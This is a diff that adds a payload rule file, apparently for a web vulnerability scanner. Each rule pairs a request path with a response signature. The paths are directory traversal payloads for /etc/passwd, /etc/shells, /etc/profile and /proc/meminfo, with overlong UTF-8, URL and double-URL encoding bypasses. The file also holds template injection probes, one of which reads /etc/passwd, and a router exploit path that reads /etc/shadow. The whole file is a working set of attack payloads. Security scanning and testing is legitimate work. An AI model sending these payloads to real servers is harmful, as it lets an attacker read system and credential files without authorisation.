@@ -1,0 +1,27 @@
+# Directory traversal
+
+/etc/passwd            {tag="root:x:"}
+/etc/shells            {tag="/bin/bash"}
+/proc/meminfo          {tag="MemTotal"}  {status=200}                 {root_only}
+/etc/profile           {tag="/etc/profile.d/*.sh"}  {status=200}      {root_only}
+# ?x=/../../../../../../../../../../../../../../../../../etc/shells   {tag="/bin/bash"}
+/../../../../../../../../../../../../../etc/shells      {tag="/bin/bash"}      {root_only}
+/../../../../../../../../../../../../../etc/profile     {tag="/etc/profile.d/*.sh"}    {root_only}
+//././././././././././././././././././././././././../../../../../../../../etc/profile              {tag="/etc/profile.d/*.sh"}    {root_only}
+/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/shells   {status=200}  {tag="/bin/bash"}   {root_only}
+
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells    {tag="/bin/bash"}
+/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells    {tag="/bin/bash"}                   {root_only}
+/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fshells                    {tag="/bin/bash"}       {root_only}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshells    {tag="/bin/bash"}     {root_only}
+
+# /resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd      {tag="root:x:"}    {root_only}
+# add new rules
+../manage.py            {tag="__main__"}
+/..%3b/                  {tag="Directory"}
+#../requirements.pip     {tag="=="}
+#../requirements.txt     {tag="=="}
+/{{255*1589}}       {tag="405195"}
+/{{open('/etc/passwd').read()}}   {tag="root:x:"}
+# 小米路由器任意文件读取 https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md
+/api-third-party/download/extdisks../etc/shadow          {tag="root:$"}  {status=200}      {root_only}
